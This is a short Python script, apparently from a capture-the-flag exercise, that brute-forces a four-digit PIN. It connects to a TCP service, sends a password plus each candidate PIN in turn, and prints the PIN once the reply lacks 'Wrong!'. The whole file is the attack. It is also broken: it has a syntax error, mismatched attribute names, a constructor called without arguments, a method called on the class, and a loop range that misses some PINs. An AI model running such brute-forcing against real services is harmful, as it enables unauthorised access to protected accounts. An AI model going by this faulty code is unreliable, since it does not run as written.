import socket

class BF():
   def __init__(self, address, port, password):
      # Defaults to a INET TCP Socket
      self.client = socket.socket()
      self.client.connect((address, port))
      self.pw = password
      self.bufSize = 4096

   def try_pin(self, pin)
      self.client.sendall("{} {}".format(self.password, pin).encode())
      data = self.client.recv(bufSize)
      data = data.decode()

      return 'Wrong!' not in data

def main():
   client = BF()

   for pin in range(1,9999):
      result = BF.try_pin(pin)
      if result:
         print('The pin is {}'.format(pin))
         quit()

if __name__ == '__main__':
   main()
